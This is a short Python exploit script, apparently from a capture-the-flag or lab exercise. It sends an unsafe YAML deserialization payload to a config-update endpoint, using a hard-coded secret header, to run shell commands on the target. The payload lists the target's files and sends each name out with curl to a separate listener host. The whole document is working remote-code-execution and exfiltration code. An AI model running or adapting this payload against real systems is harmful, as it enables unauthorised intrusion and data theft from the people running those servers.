import requests

payload = (
    '!!python/object/apply:os.system ["bash -c '
    "'for i in $(ls); do curl http://10.17.37.98:1337/$i; done'\"]"
)

headers = {"X-FTW": "secr3tFTW192d2390", "Content-Type": "application/x-yaml"}

res = requests.post(
    "http://10.10.232.80:8080/config/update", data=payload, headers=headers
)
print(res.status_code, res.text)